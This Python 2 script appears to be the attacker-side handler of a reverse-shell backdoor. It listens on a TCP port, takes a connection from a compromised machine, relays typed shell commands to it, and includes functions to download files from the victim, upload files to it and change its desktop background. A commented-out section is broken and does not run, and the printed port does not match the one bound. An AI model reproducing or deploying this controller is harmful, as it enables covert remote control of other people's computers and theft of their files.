import socket 
import os      
import threading

#CD , LS , DIR , needs fixing
'''
def cd(conn,command):
	conn.send('pwd')
	cdto=str(command.split(' ')[-1])

	pathinit=conn.recv(1024)
	path=map(str,pathinit.split('/'))
	del(path[0])

	elif cdto[0]=='/':
		return str(cdto)
	elif cdto[0]=='.':
		return str(pathinit)+str(cdto)
	else :
		s='..'
		k=0
		for s in cdto:
			k+=1
		for i in range(k):
			del	


def ls(conn,command):
	pathtemp=str(cd(conn,command))
	conn.send('ls '+pathtemp)
	print conn.recv(1024)
    '''



def transfer(conn,command):
	conn.send(command)
	file = command.split('*')[-1]
	f = open('/root/Desktop/pypy/'+file,'wb') 
	bits = conn.recv(1024)
	while bits!='': 
		if 'Unable to find out the file' in bits:
			print '[-] Unable to find out the file'
			break
		f.write(bits)
		bits=conn.recv(1024)
		if bits.endswith('DONE'):
			bits=bits.replace('DONE','')
			f.write(bits)
			f.close()
			break
		
	
        
    
def sendd(conn,command):
	conn.send(command)
	file=command.split('*')[-1]
	file_to_send=open('/root/Desktop/pypy/'+str(file),'rb')
	packet=file_to_send.read(1024)
	while packet!='':
		conn.send(packet) 
		packet = file_to_send.read(1024)
	conn.send('DONE')
	if conn.recv(1024)=='DONE':
		file_to_send.close()
		print 'Send Successful'


def connect():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(("127.0.0.1", 8082))
        s.listen(100)
        print '[+] Listening for incoming TCP connection on port 8080'
        conn,addr=s.accept()
        print '[+] We got a connection from: ', addr
        while True:   
                command=raw_input("Shell>")		
                if 'terminate' in command:
                        conn.send('terminate')
                        conn.close() 
                        break
                elif 'download' in command: 
                        transfer(conn,command)
                elif 'upload' in command:
                        sendd(conn,command)
                elif 'browse' in command:
                        conn.send(command)
                        pass
                elif 'change_dk_bg' in command:
                        conn.send(command)
                        pass
                else :	
                        conn.send(command) 
                        print conn.recv(1024)
        
def main ():
	connect()
main()











